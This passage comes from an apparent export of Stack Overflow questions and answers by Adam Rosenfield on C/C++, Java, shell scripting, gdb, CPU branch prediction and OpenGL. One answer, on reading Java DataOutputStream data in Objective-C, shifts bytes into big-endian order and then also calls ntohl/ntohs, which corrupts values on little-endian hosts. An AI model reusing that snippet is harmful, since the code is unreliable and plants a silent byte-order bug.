<p>This is on an embedded device (Freescale S12XEQ device) using Code Warrior.  It's a 16 bit device with 24 bit memory space, so yes, it is segmented/banked.</p>


","9530","Adam Rosenfield","<p><i>Is the __far in the right spot in the typedef?</i></p>

<p>[Edit, in response to ChrisN's comment -- thanks]</p>

<p>This is a compiler-dependent feature, since it is not part of ANSI C.  According to the compiler manual &lt;<a href=""http://www.freescale.com/files/soft_dev_tools/doc/ref_manual/CW_Compiler_HC12_RM.pdf"">http://www.freescale.com/files/soft_dev_tools/doc/ref_manual/CW_Compiler_HC12_RM.pdf</a>&gt;, chapter 8, you have it placed correctly.  In other compilers, you may need to reverse the order.  This should be pretty easy to figure out, though, since exactly one of the two options will compile with any given compiler.</p>

<p><i>Do I need to add __far to the (MYFP) cast?</i></p>

<p>Nope, it's part of the type.</p>

<p><em>Some information suggests that the call to foo doesn't need to be dereferenced, what is your experience?</em></p>

<p>Function pointers can be optionally dereferenced in C.  The following lines are both valid do the exact same thing:</p>

<pre><code>foo = (MYFP)0xFFFFFA;
returnvalue = foo(39);  // 1
returnvalue = (*foo)(39);  // 2
</code></pre>

<p><em>What else about this looks incorrect, or might I try to accomplish this?</em></p>

<p>You've done it exactly correctly.</p>
"
"<p>In java, does <code>file.delete()</code> return <code>true</code> or <code>false</code> where <code>File file</code> refers to a non-existent file?</p>

<p>I realize this is kind of a basic question, and easy to very through test, but I'm getting strange results and would appreciate confirmation.</p>
","9530","Adam Rosenfield","<p>From <a href=""http://java.sun.com/j2se/1.5.0/docs/api/java/io/File.html#delete()"" rel=""nofollow"">http://java.sun.com/j2se/1.5.0/docs/api/java/io/File.html#delete()</a>:</p>

<p>Returns: true if and only if the file or directory is successfully deleted; false otherwise</p>

<p>Therefore, it should return false for a non-existent file.  The following test confirms this:</p>

<pre><code>import java.io.File;

public class FileTest
{
    public static void main(String[] args)
    {
        File file = new File(""non-existent file"");

        boolean result = file.delete();
        System.out.println(result);
    }
}</code></pre>

<p>Compiling and running this code yields false.</p>
"
"<p>I run an OpenSuse server that uploads zipped source code backups to a Microsoft FTP server every night. I have written a Bash script that does this through a cron job.</p>

<p>I want to delete backed up files that are older than a certain date. How could I do this?</p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>The following deletes all files under the directory tree rooted at <em>dir</em> whose last modification time was before November 1:</p>

<pre><code>find dir -type f \! -newermt 2008-11-01 -exec rm '{}' \+
</code></pre>

<p>The date/time format should be ISO 8601; I don't know if other formats are accepted.</p>
"
"<p>I've created a a folder and after I open a file inside of that folder a write on it.
It happens that after that I try to open the file but I have no permissions thus I have to change it manually.</p>

<pre><code>/* str1 has tha name of the folder */
/* str the bytes I want to write in the file inside the folder*/
...

   mkdir(str1,0777);    
   if (filefd &lt; 0) { 

      strncpy(auxstr, str, MAX_MSG + 1);
      strcat(str1,""\\"");
      strcat(str1, auxstr);
      filefd = open (str1, O_RDWR | O_CREAT | O_TRUNC);

      nbytes -= (strlen(str) + 1);
      memcpy(auxstr, &amp;str[strlen(str)+1], nbytes); 
      memcpy(str, auxstr, nbytes);

   }

   /*write to the file */
   if ((nwritten = write(filefd, str, nbytes)) != nbytes) {
       printf (""can't write on file\n"");
       break;
   }
</code></pre>

<p>What should I change in order to have permissions to open the created file?</p>

<p>Thanks a lot,</p>

<hr>

<p>:s</p>

<p>with = 0_CREATE I STILL have the problem of no having permissions to read the file.
I have to set them manually</p>

<hr>

<p>And I already have the 0_CREAT at the open</p>

<p>open (str1, O_RDWR | O_CREAT | O_TRUNC);</p>
","9530","Adam Rosenfield","<p>The problem is that you're using the wrong path separator - you're trying to use a backslash <code>'\\'</code> to separate the components.  This is the path separator for Windows.  Since you appear to be using a *nix-based operating system, you should use forward slash <code>'/'</code> as a path separator.  In fact, even on Windows you should use forward slash, since it's more portable - Windows automatically converts forward slashes to backslashes.</p>

<p>As a result, you're trying to create a file named ""foo\bar"" in the current directory, and that's probably failing since you don't have permissions to create a file in the current directory.</p>
"
"<p>How do I check to see if a variable is a number, or contains a number, in UNIX shell?</p>
","9530","Adam Rosenfield","<pre><code>if echo $var | egrep -q '^[0-9]+$'; then
    # $var is a number
else
    # $var is not a number
fi
</code></pre>
"
"<p>What do the terms mean in each of the above languages? Why do the languages differ (wherever they do, if at all they do) in this respect?</p>
","9530","Adam Rosenfield","<h1>C/C++:</h1>

<p>A <em>declaration</em> is a statement that says ""here is the name of something and the type of thing that it is, but I'm not telling you anything more about it"".</p>

<p>A <em>definition</em> is a statement that says ""here is the name of something and what exactly it is"".  For functions, this would be the function body; for global variables, this would be the translation unit in which the variable resides.</p>

<p>An <em>initialization</em> is a definition where the variable is also given an initial value.  Some languages automatically initialize all variables to some default value such as 0, false, or null.  Some (like C/C++) don't in all cases: all global variables are default-initialized, but local variables on the stack and dynamically allocated variables on the heap are NOT default initialized - they have undefined contents, so you must explicitly initialize them.  C++ also has default constructors, which is a whole nother can of worms.</p>

<p>Examples:</p>

<pre><code>
// In global scope:
extern int a_global_variable;  // declaration of a global variable
int a_global_variable;         // definition of a global variable
int a_global_variable = 3;     // definition & initialization of a global variable

int some_function(int param);  // declaration of a function
int some_function(int param)    // definition of a function
{
    return param + 1;
}

struct some_struct;  // declaration of a struct; you can use pointers/references to it, but not concrete instances
struct some_struct   // definition of a struct
{
    int x;
    int y;
};

class some_class;  // declaration of a class (C++ only); works just like struct
class some_class   // definition of a class (C++ only)
{
    int x;
    int y;
};

enum some_enum;  // declaration of an enum; works just like struct & class
enum some_enum   // definition of an enum
{
   VALUE1,
   VALUE2
};
</code></pre>

<p>I'm not as familiar with the other languages you asked about, but I believe they don't make much of a distinction between declarations and definitions.  C# and Java have default initialization for all objects - everything is initialized to 0, false, or null if you don't explicitly initialize it.  Python is even more lax, since variables don't need to be declared before they're used.  Since bindings are resolved at runtime, there's no real need for declarations of functions, either.</p>
"
"<p>Where can I find pascal-style railroad diagrams to describe C++ syntax?
(As an alternative to EBNF)</p>
","9530","Adam Rosenfield","<p>There isn't one - the C++ grammar is not only <strong>not</strong> context-free, it's undecidable.  See <a href=""http://yosefk.com/c++fqa/defective.html#defect-2"" rel=""nofollow"">http://yosefk.com/c++fqa/defective.html#defect-2</a> and the associated links for a more in-depth discussion.</p>
"
"<p>My log file is:</p>

<pre><code> Wed Nov 12 blah blah blah blah cat1
 Wed Nov 12 blah blah blah blah
 Wed Nov 12 blah blah blah blah 
 Wed Nov 12 blah blah blah blah cat2
     more blah blah
     even more blah blah
 Wed Nov 12 blah blah blah blah cat3
 Wed Nov 12 blah blah blah blah cat4
</code></pre>

<p>I want to parse out the full multiline entries where cat is found on the first line.  What's the best way to do this in sed and/or awk?</p>

<p>i.e. i want my parse to produce:</p>

<pre><code> Wed Nov 12 blah blah blah blah cat1
 Wed Nov 12 blah blah blah blah cat2
     more blah blah
     even more blah blah
 Wed Nov 12 blah blah blah blah cat3
 Wed Nov 12 blah blah blah blah cat4
</code></pre>
","9530","Adam Rosenfield","<p>Assuming your log file does not contain the control characters <code>'\01'</code> and <code>'\02'</code>, and that a continued line begins with precisely four spaces, the following might work:</p>

<pre><code>c1=`echo -en '\01'`
c2=`echo -en '\02'`
cat logfile | tr '\n' $c1 | sed ""s/$c1    /$c2/g"" | sed ""s/$c1/\n/g"" | grep cat | sed ""s/$c2/\n    /g""
</code></pre>

<p>Explanation: this replaces each newline with ASCII 1 (a control character that should never appear in a log file) and each sequence ""newline-space-space-space-space"" with ASCII 2 (another control character).  It then re-replaces ASCII 1 with newlines, so now each sequence of multiple lines is put into one line, with the old line breaks replaced by ASCII 2.  This is grepped for cat, and then the ASCII 2's are re-replaced with the newline-space-space-space-space combination.</p>
"
"<p>I'm working on a programming language, and today I got the point where I could compile the factorial function(recursive), however due to the maximum size of an integer the largest I can get is factorial(12).  What are some techniques for handling integers of an arbitrary maximum size.  The language currently works by translating code to C++.</p>
","9530","Adam Rosenfield","<p>There's no easy way to do it in C++.  You'll have to use an external library such as <a href=""http://gmplib.org/"" rel=""nofollow"">GNU Multiprecision</a>, or use a different language which natively supports arbitrarily large integers such as Python.</p>
"
"<p>I can't, for the life of me, remember what exactly did our teacher said that day and I'm hoping you would probably know.</p>

<p>The module is ""Data Structures and Algorithms"" and he told us something along the lines of:</p>

<blockquote>
  <p>The if statement is the most expensive
  [something]. [something] registers
  [something].</p>
</blockquote>

<p>Yes, I do have a horrible memory and I'm really really sorry, but I've been googling for hours and nothing has come up. Any ideas?</p>
","9530","Adam Rosenfield","<p>At the very lowest level (in the hardware), yes, <strong>if</strong>s are expensive.  In order to understand why, you have to understand how <a href=""http://en.wikipedia.org/wiki/Pipeline_(computing)"">pipelines</a> work.</p>

<p>The current instruction to be executed is stored in something typically called the <em>instruction pointer</em> (IP) or <em>program counter</em> (PC); these terms are synonymous, but different terms are used with different architectures.  For most instructions, the PC of the next instruction is just the current PC plus the length of the current instruction.  For most RISC architectures, instructions are all a constant length, so the PC can be incremented by a constant amount.  For CISC architectures such as x86, instructions can be variable-length, so the logic that decodes the instruction has to figure out how long the current instruction is to find the location of the next instruction.</p>

<p>For <em>branch</em> instructions, however, the next instruction to be executed is not the next location after the current instruction.  Branches are gotos - they tell the processor where the next instruction is.  Branches can either be conditional or unconditional, and the target location can be either fixed or computed.</p>

<p>Conditional vs. unconditional is easy to understand - a conditional branch is only taken if a certain condition holds (such as whether one number equals another); if the branch is not taken, control proceeds to the next instruction after the branch like normal.  For unconditional branches, the branch is always taken.  Conditional branches show up in <code>if</code> statements and the control tests of <code>for</code> and <code>while</code> loops.  Unconditional branches show up in infinite loops, function calls, function returns, <code>break</code> and <code>continue</code> statements, the infamous <code>goto</code> statement, and many more (these lists are far from exhaustive).</p>

<p>The branch target is another important issue.  Most branches have a fixed branch target - they go to a specific location in code that is fixed at compile time.  This includes <code>if</code> statements, loops of all sorts, regular function calls, and many more.  <em>Computed</em> branches compute the target of the branch at runtime.  This includes <code>switch</code> statements (sometimes), returning from a function, virtual function calls, and function pointer calls.</p>

<p>So what does this all mean for performance?  When the processor sees a branch instruction appear in its pipeline, it needs to figure out how to continue to fill up its pipeline.  In order to figure out what instructions come after the branch in the program stream, it needs to know two things: (1) if the branch will be taken and (2) the target of the branch.  Figuring this out is called <a href=""http://en.wikipedia.org/wiki/Branch_prediction"">branch prediction</a>, and it's a challenging problem.  If the processor guesses correctly, the program continues at full speed.  If instead the processor guesses <em>incorrectly</em>, it just spent some time computing the wrong thing.  It now has to flush its pipeline and reload it with instructions from the correct execution path.  Bottom line: a big performance hit.</p>

<p>Thus, the reason why if statements are expensive is due to <strong>branch mispredictions</strong>.  This is only at the lowest level.  If you're writing high-level code, you don't need to worry about these details at all.  You should only care about this if you're writing extremely performance-critical code in C or assembly.  If that is the case, writing branch-free code can often be superior to code that branches, even if several more instructions are needed.  There are some cool bit-twiddling tricks you can do to compute things such as <code>abs()</code>, <code>min()</code>, and <code>max()</code> without branching.</p>
"
"<p>Nearly all programming languages used are <a href=""http://en.wikipedia.org/wiki/Turing_Complete"">Turing Complete</a>, and while this affords the language to represent any <a href=""http://en.wikipedia.org/wiki/Computability_theory_(computer_science)"">computable</a> algorithm, it also comes with its own set of <a href=""http://en.wikipedia.org/wiki/Halting_problem"">problems</a>. Seeing as all the algorithms I write are intended to halt, I would like to be able to represent them in a language that guarantees they will halt.</p>

<p><a href=""http://en.wikipedia.org/wiki/Regular_Expression"">Regular expressions</a> used for matching strings and <a href=""http://en.wikipedia.org/wiki/Finite_state_machine"">finite state machines</a> are used when <a href=""http://en.wikipedia.org/wiki/Lexing"">lexing</a>, but I'm wondering if there's a more general, broadly language that's not Turing complete?</p>

<p><strong>edit:</strong> I should clarify, by 'general purpose' I don't necessarily want to be able to write all halting algorithms in the language (I don't think that such a language would exist) but I suspect that there are common threads in halting proofs that can be generalized to produce a language in which all algorithms are guaranteed to halt.</p>

<p>There's also another way to tackle this problem - eliminate the need for theoretically infinite memory. Once you limit the amount of memory the machine is allowed, the number of states the machine is in is finite and countable, and therefore you can determine if the algorithm will halt (by not allowing the machine to move into a state it's been in before).</p>
","9530","Adam Rosenfield","<p><a href=""http://en.wikipedia.org/wiki/BlooP_and_FlooP"">BlooP</a> (short for <strong>B</strong>ounded <strong>loop</strong>) is an interesting non-Turing-complete language.  It's a essentially a Turing-complete language, with one (major) caveat: every loop <em>must</em> contain a bound on the number of iterations.  Infinite loops are not allowed.  As a result, the Halting Problem can be solved for BlooP programs.</p>
"
"<p>I have two questions:</p>

<p>1) How can I make an array which points to objects of integers?</p>

<pre><code>int* myName[5];  // is this correct?
</code></pre>

<p>2) If I want to return a pointer to an array, which points to objects (like (1)) how can I do this in a method? ie) I want to impliment the method:</p>

<pre><code>int **getStuff() {
// what goes here?
return *(myName); // im pretty sure this is not correct
}
</code></pre>

<p>Thanks for the help!</p>
","9530","Adam Rosenfield","<p>1) Correct - this is an array of 5 pointers to <code>int</code>s</p>

<p>2) You can return a pointer to an array of pointers to <code>int</code>s by returning a pointer to the first element of that array.  This has two levels of indirection, so you need two asterisks.  You can also return the array normally, since arrays automatically decay into pointers to their first elements.</p>

<pre><code>int **getStuff() {
    return myName;       // 1
    return &amp;myName[0];   // 2
}
</code></pre>
"
"<p>I have a structure which I create a custom constructor to initialize the members to 0's.  I've seen in older compilers that when in release mode, without doing a memset to 0, the values are not initialized.</p>

<p>I now want to use this structure in a union, but get errors because it has a non-trivial constructor.</p>

<p>So, question 1.  Does the default compiler implemented constructor guarantee that all members of a structure will be null initialized?  The non-trivial constructor just does a memset of all the members to '0' to ensure a clean structure.</p>

<p>Question 2:  If a constructor must be specified on the base structure, how can a union be implemented to contain that element and ensure a 0 initialized base element?</p>
","9530","Adam Rosenfield","<p>As mentioned in Greg Rogers' comment to <a href=""http://stackoverflow.com/questions/321351/initializing-a-union-with-a-non-trivial-constructor#321466"">unwesen</a>'s post, you can give your union a constructor (and destructor if you wish):</p>

<pre><code>struct foo
{
    int a;
    int b;
};

union bar
{
    bar() { memset(this, 0, sizeof(*this)); }

    int a;
    foo f;
};
</code></pre>
"
"<p>Is there a good equivalent implementation of <code>strptime()</code> available for Windows?  Unfortunately, this POSIX function does not appear to be available.</p>

<p><a href=""http://www.opengroup.org/onlinepubs/009695399/functions/strptime.html"">Open Group description of strptime</a> - summary: it converts a text string such as <code>""MM-DD-YYYY HH:MM:SS""</code> into a <code>tm struct</code>, the opposite of <code>strftime()</code>.</p>
","9530","Adam Rosenfield","<p>An open-source version (BSD license) of <code>strptime()</code> can be found here: <a href=""http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/time/strptime.c?rev=HEAD"">http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/time/strptime.c?rev=HEAD</a></p>

<p>You'll need to add the following declaration to use it:</p>

<pre><code>char *strptime(const char * __restrict, const char * __restrict, struct tm * __restrict);
</code></pre>
"
"<p>I was wondering if it is possible to declare an array (size not known at this time), as a private member of a class and later set the size in the constructor of the class.  For example:</p>

<pre><code>class Test {
int a[];
public:
Test(int size);
};

Test::Test(int size) {
a[size];   // this is wrong, but what can i do here?
}
</code></pre>

<p>Is this possible or should I use dynamic arrays?  Thanks!</p>
","9530","Adam Rosenfield","<p>No, this is not possible.  You should use a dynamic array such as an <code>std::vector</code>.  C99 allows a struct to have an unsized array as the <em>last</em> member only, but even when you do this you still have to manually allocate the memory yourself, e.g. with <code>malloc()</code>.</p>
"
"<p>I'd like to write a script that (under certain conditions) will execute gdb and automatically run some program X with some set of arguments Y.  Once the program has finished executing the user should remain at gdb's prompt until s/he explicitly exits it.</p>

<p>One way to do this would be to have the script output the run command plus arguments Y to some file F and then have the script invoke gdb like this:</p>

<pre><code>gdb X &lt; F
</code></pre>

<p>But is there a way to do this without introducing a temporary file?</p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>If you want to run some commands through GDB and then have it exit or run to completion, just do</p>

<pre><code>echo commands | gdb X
</code></pre>

<p>If you want to leave it at the command prompt after running those commands, you can do</p>

<pre><code>(echo commands; cat) | gdb X
</code></pre>

<p>This results in echoing the commands to GDB, and then you type into the <code>cat</code> process, which copies its stdin to stdout, which is piped into GDB.</p>
"
"<p>I'm looking for something like paint.net or Gimp, but for audio files, and runs on windows.</p>
","9530","Adam Rosenfield","<p>As already mentioned, Audacity is fantastic.  If you're looking to batch convert sound files at the command line, check out <a href=""http://www.mplayerhq.hu"" rel=""nofollow"">mencoder</a> and (for MP3s only) <a href=""http://lame.sourceforge.net/"" rel=""nofollow"">LAME</a>.</p>
"
"<p>We have a JavaEE server and servlets providing data to mobile clients (first JavaME, now soon iPhone). The servlet writes out data using the following code:</p>

<pre><code>DataOutputStream dos = new DataOutputStream(out);

dos.writeInt(someInt);

dos.writeUTF(someString);
</code></pre>

<p>... and so on</p>

<p>This data is returned to the client as bytes in the HTTP response body, to reduce the number of bytes transferred.</p>

<p>In the iPhone app, the response payload is loaded into NSData object. Now, after spending hours and hours trying to figure out how to read the data out in the Objective-C application, I'm almost ready to give up, as I haven't found any good way to read the data into NSInteger and NSString (as corresponding to above protocol)</p>

<p>Would anyone have any pointers how to read stuff out from a binary protocol written by a java app? Any help is greatly appreciated!</p>

<p>Thanks!</p>
","9530","","<p>You'll have to do the demarshalling yourself; fortunately, it's fairly straightforward.  Java's <code>DataOutputStream</code> class writes integers in big-endian (network) format.  So, to demarshall the integer, we grab 4 bytes and unpack them into a 4-byte integer.</p>

<p>For UTF-8 strings, <code>DataOutputStream</code> first writes a 2-byte value indicating the number of bytes that follow.  We read that in, and then read the subsequent bytes.  Then, to decode the string, we can use the <code>NSString</code> method <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/initWithBytes:length:encoding:"" rel=""nofollow""><code>initWithBytes:length:encoding:</code></a> as so:</p>

<pre><code>NSData *data = ...;  // this comes from the HTTP request
int length = [data length];
const uint8_t *bytes = (const uint8_t *)[data bytes];

if(length &lt; 4)
    ; // oops, handle error

// demarshall the big-endian integer from 4 bytes
uint32_t myInt = (bytes[0] &lt;&lt; 24) | (bytes[1] &lt;&lt; 16) | (bytes[2] &lt;&lt; 8) | (bytes[3]);
// convert from (n)etwork endianness to (h)ost endianness (may be a no-op)
// ntohl is defined in &lt;arpa/inet.h&gt;
myInt = ntohl(myInt);

// advance to next datum
bytes += 4;
length -= 4;

// demarshall the string length
if(length &lt; 2)
    ; // oops, handle error
uint16_t myStringLen = (bytes[0] &lt;&lt; 8) | (bytes[1]);
// convert from network to host endianness
myStringLen = ntohs(myStringLen);
bytes += 2;
length -= 2;

// make sure we actually have as much data as we say we have
if(myStringLen &gt; length)
    myStringLen = (uint16_t)length;

// demarshall the string
NSString *myString = [[NSString alloc] initWithBytes:bytes length:myStringLen encoding:NSUTF8StringEncoding];
bytes += myStringLen;
length -= myStringLen;
</code></pre>

<p>You can (and probably should) write functions to demarshall, so that you don't have to repeat this code for every field you want to demarshall.  Also, be <strong>extra careful</strong> about <strong>buffer overflows</strong>.  You're handling data sent over the network, which you should always distrust.  <strong>Always</strong> verify your data, and <strong>always</strong> check your buffer lengths.</p>
"
"<p>I'm following the sample code in <em>CFNetwork Programming Guide</em>, specifically the section on <strong>Preventing Blocking When Working with Streams</strong>.  my code is nearly identical to theirs (below) but, when I connect to my server, I get posix error 14 (bad address -- is that bad IP address (except it's not)?  Bad memory address for some call I made?  or what?!.</p>

<p>I have no idea how to go about debugging this.  I'm really pretty new to the whole CFNetworking thing, and was never particularly expert at networks in the first place (the one thing I really loved about Java: easy networks! :D)</p>

<p>Anyway, log follows, with code below.  Any hints would be greatly appreciated.</p>

<p>Log:</p>

<pre><code>[6824:20b] [DEBUG] Compat version: 30000011
[6824:20b] [DEBUG] resovled host.
[6824:20b] [DEBUG] writestream opened.
[6824:20b] [DEBUG] readstream client assigned.
[6824:20b] [DEBUG] readstream opened.
[6824:20b] [DEBUG] *** Read stream reported kCFStreamEventErrorOccurred
[6824:20b] [DEBUG] *** POSIX error: 14 - Bad address
[6824:20b] Error closing readstream
[6824:20b] [DEBUG] Writing int: 0x09000000 (0x00000009)
</code></pre>

<p>Code:</p>

<pre><code>+ (BOOL) connectToServerNamed:(NSString*)name atPort:(int)port {
    CFHostRef theHost = CFHostCreateWithName (NULL, (CFStringRef)name);
    CFStreamError error;

    if (CFHostStartInfoResolution (theHost, kCFHostReachability, &amp;error))
    {
        NSLog (@""[DEBUG] resovled host."");
        CFStreamCreatePairWithSocketToCFHost (NULL, theHost, port, &amp;readStream, &amp;writeStream);
        if (CFWriteStreamOpen(writeStream))
        {
            NSLog (@""[DEBUG] writestream opened."");

            CFStreamClientContext myContext = { 0, self, NULL, NULL, NULL };
            CFOptionFlags registeredEvents = kCFStreamEventHasBytesAvailable |
                    kCFStreamEventErrorOccurred | kCFStreamEventEndEncountered;
            if (CFReadStreamSetClient (readStream, registeredEvents, readCallBack, &amp;myContext))
            {
                NSLog (@""[DEBUG] readstream client assigned."");
                CFReadStreamScheduleWithRunLoop(readStream, CFRunLoopGetCurrent(),
                                                kCFRunLoopCommonModes);
                if (CFReadStreamOpen(readStream))
                {
                    NSLog (@""[DEBUG] readstream opened."");
                    CFRunLoopRun();
         // Lots of error condition handling snipped.
        [...]
    return YES;
}


void readCallBack (CFReadStreamRef stream, CFStreamEventType event, void *myPtr)
{
    switch (event)
    {
        case kCFStreamEventHasBytesAvailable:
        {
            CFIndex bytesRead = CFReadStreamRead(stream, buffer, kNetworkyBitsBufferSize); // won't block
            if (bytesRead &gt; 0)                                                  // &lt;= 0 leads to additional events
            {
                if (listener)
                {
                    UInt8 *tmpBuffer = malloc (sizeof (UInt8) * bytesRead);
                    memcpy (buffer, tmpBuffer, bytesRead);
                    NSLog(@""[DEBUG] reveived %d bytes"", bytesRead);
                    [listener networkDataArrived:tmpBuffer count:bytesRead];
                }
                NSLog(@""[DEBUG] reveived %d bytes; no listener"", bytesRead);
            }
        }
            break;

        case kCFStreamEventErrorOccurred:
            NSLog(@""[DEBUG] *** Read stream reported kCFStreamEventErrorOccurred"");
            CFStreamError error = CFReadStreamGetError(stream);
            logError(error);
            [NetworkyBits shutDownRead];
            break;

        case kCFStreamEventEndEncountered:
            NSLog(@""[DEBUG] *** Read stream reported kCFStreamEventEndEncountered"");
            [NetworkyBits shutDownRead];
            break;
    }
}

void logError (CFStreamError error)
{
    if (error.domain == kCFStreamErrorDomainPOSIX)                              // Interpret error.error as a UNIX errno.
    {
        NSLog (@""[DEBUG] *** POSIX error: %d - %s"", (int) error.error, strerror(error.error));
    }
    else if (error.domain == kCFStreamErrorDomainMacOSStatus)
    {
        NSLog (@""[DEBUG] *** MacOS error: %d"", (int) error.error);
    }
    else
    {
        NSLog (@""[DEBUG] *** Stream error domain: %d, error: %d"", (int) error.error);
    }
}
</code></pre>
","9530","Adam Rosenfield","<p>I'm not familiar with Cocoa or Objective-C, but I can tell you that POSIX error code 14 is called <a href=""http://www.wlug.org.nz/EFAULT"" rel=""nofollow"">EFAULT</a>, and it means you made a system call with an invalid pointer value.  This is almost certainly some user-supplied buffer pointer to a read or write system call of some sort.  Check all of the buffer pointers and make sure they're not NULL.  Check the return value from <code>malloc()</code> - you might be failing to allocate a buffer.</p>
"
"<p>What is a generic list manipulation function in C?
(I saw this when I was going through some materials.)</p>

<p>What  is the difference between this function and a function which can accept elements of any kind?</p>

<p>Are they same...? How can we implement them individually if they are not same?</p>
","9530","Adam Rosenfield","<p>C has no concept of ""generic"" pointers or objects - the closest you can get is using a <code>void*</code> pointer.  If you want one piece of code to be able to handle any data type, you pretty much have to use <code>void*</code> pointers.  For data types with sizes no larger than a pointer, you can cast between the type and <code>void*</code>; for larger data types, you'll have to use dynamic memory and have the <code>void*</code> member point to the dynamic memory.  Just watch out for memory leaks!</p>

<pre><code>typedef struct list_node {
  struct list_node *next;
  void *data;
} list_node;

void list_insert(list_node *node, void *data) {
  // ...
}
</code></pre>

<p>On the other hand, if you want to generate code for each possible data type, you'll have to do it with macros, and then instantiate the macros for each data type you might use.  For example:</p>

<pre><code>#define DEFINE_LIST(type) \
  typedef struct list_node_##type { \
    struct list_node_##type *next; \
    type data; \
  }

#define IMPLEMENT_LIST_INSERT(type) \
  void list_##type##_insert(list_node_##type *node, type data) { \
    ... \
  }

DEFINE_LIST(int);     // defines struct list_node_int
DEFINE_LIST(double);  // defines struct list_node_double
IMPLEMENT_LIST_INSERT(int);    // defines list_int_insert
IMPLEMENT_LIST_INSERT(double); // defines list_double_insert
</code></pre>
"
"<p>I can find tutorials about mapping textures to polygons specifying vertices etc. but nothing regarding how to apply a texture to a cube (or other stuff) drawn with glut (glutSolidCube).</p>

<p>I am doing something like:</p>

<pre><code>glTexEnvfv(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, decal);
glTexParameterfv(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, repeat);
glTexParameterfv(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, repeat);
glTexParameterfv(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, nearest);
glTexParameterfv(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, nearest);

glPixelStorei(GL_UNPACK_ALIGNMENT, 1);
glTexImage2D(GL_TEXTURE_2D, 0, 4, myImageWidth, myImageHeight, 0, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)myImage);

//...

glEnable(GL_TEXTURE_2D);

//now draw the cube
glutSolidCube(N);
</code></pre>

<p>Doing this I get the texture to apply to the cube but the whole cube gets the color of the first byte in the texture!</p>

<p>Is there any way of mapping a texture to a solid cube (and other solids) when using glutSolidCube?</p>

<p>Any help would be appreciated</p>
","9530","Adam Rosenfield","<p>No, since <code>glutSolidCube()</code> does not generate texture coordinates.  Fortunately, though, <code>glutSolidCube()</code> is easy to implement yourself and add texture coordinates.  Here's the source code to <code>glutSolidCube()</code> and associated functions, from <a href=""http://www.opengl.org/resources/libraries/glut/"">http://www.opengl.org/resources/libraries/glut/</a>:</p>

<pre><code>/* Copyright (c) Mark J. Kilgard, 1994, 1997. */

/**                                                                             
(c) Copyright 1993, Silicon Graphics, Inc.                                      

ALL RIGHTS RESERVED                                                             

Permission to use, copy, modify, and distribute this software                   
for any purpose and without fee is hereby granted, provided                     
that the above copyright notice appear in all copies and that                   
both the copyright notice and this permission notice appear in                  
supporting documentation, and that the name of Silicon                          
Graphics, Inc. not be used in advertising or publicity                          
pertaining to distribution of the software without specific,                    
written prior permission.

THE MATERIAL EMBODIED ON THIS SOFTWARE IS PROVIDED TO YOU
""AS-IS"" AND WITHOUT WARRANTY OF ANY KIND, EXPRESS, IMPLIED OR
OTHERWISE, INCLUDING WITHOUT LIMITATION, ANY WARRANTY OF
MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.  IN NO
EVENT SHALL SILICON GRAPHICS, INC.  BE LIABLE TO YOU OR ANYONE
ELSE FOR ANY DIRECT, SPECIAL, INCIDENTAL, INDIRECT OR
CONSEQUENTIAL DAMAGES OF ANY KIND, OR ANY DAMAGES WHATSOEVER,
INCLUDING WITHOUT LIMITATION, LOSS OF PROFIT, LOSS OF USE,
SAVINGS OR REVENUE, OR THE CLAIMS OF THIRD PARTIES, WHETHER OR
NOT SILICON GRAPHICS, INC.  HAS BEEN ADVISED OF THE POSSIBILITY
OF SUCH LOSS, HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
ARISING OUT OF OR IN CONNECTION WITH THE POSSESSION, USE OR
PERFORMANCE OF THIS SOFTWARE.

US Government Users Restricted Rights

Use, duplication, or disclosure by the Government is subject to
restrictions set forth in FAR 52.227.19(c)(2) or subparagraph
(c)(1)(ii) of the Rights in Technical Data and Computer
Software clause at DFARS 252.227-7013 and/or in similar or
successor clauses in the FAR or the DOD or NASA FAR
Supplement.  Unpublished-- rights reserved under the copyright
laws of the United States.  Contractor/manufacturer is Silicon
Graphics, Inc., 2011 N.  Shoreline Blvd., Mountain View, CA
94039-7311.

OpenGL(TM) is a trademark of Silicon Graphics, Inc.
*/

static void
drawBox(GLfloat size, GLenum type)
{
  static GLfloat n[6][3] =
  {
    {-1.0, 0.0, 0.0},
    {0.0, 1.0, 0.0},
    {1.0, 0.0, 0.0},
    {0.0, -1.0, 0.0},
    {0.0, 0.0, 1.0},
    {0.0, 0.0, -1.0}
  };
  static GLint faces[6][4] =
  {
    {0, 1, 2, 3},
    {3, 2, 6, 7},
    {7, 6, 5, 4},
    {4, 5, 1, 0},
    {5, 6, 2, 1},
    {7, 4, 0, 3}
  };
  GLfloat v[8][3];
  GLint i;

  v[0][0] = v[1][0] = v[2][0] = v[3][0] = -size / 2;
  v[4][0] = v[5][0] = v[6][0] = v[7][0] = size / 2;
  v[0][1] = v[1][1] = v[4][1] = v[5][1] = -size / 2;
  v[2][1] = v[3][1] = v[6][1] = v[7][1] = size / 2;
  v[0][2] = v[3][2] = v[4][2] = v[7][2] = -size / 2;
  v[1][2] = v[2][2] = v[5][2] = v[6][2] = size / 2;

  for (i = 5; i &gt;= 0; i--) {
    glBegin(type);
    glNormal3fv(&amp;n[i][0]);
    glVertex3fv(&amp;v[faces[i][0]][0]);
    glVertex3fv(&amp;v[faces[i][1]][0]);
    glVertex3fv(&amp;v[faces[i][2]][0]);
    glVertex3fv(&amp;v[faces[i][3]][0]);
    glEnd();
  }
}

void APIENTRY
glutSolidCube(GLdouble size)
{
  drawBox(size, GL_QUADS);
}
</code></pre>

<p>Just add in some calls to the <a href=""http://www.opengl.org/documentation/specs/man_pages/hardcopy/GL/html/gl/texcoord.html"">glTexCoord*</a> family of functions.  <a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=06"">NeHe</a> has a good tutorial on how to get started with texture mapping with OpenGL.</p>
"
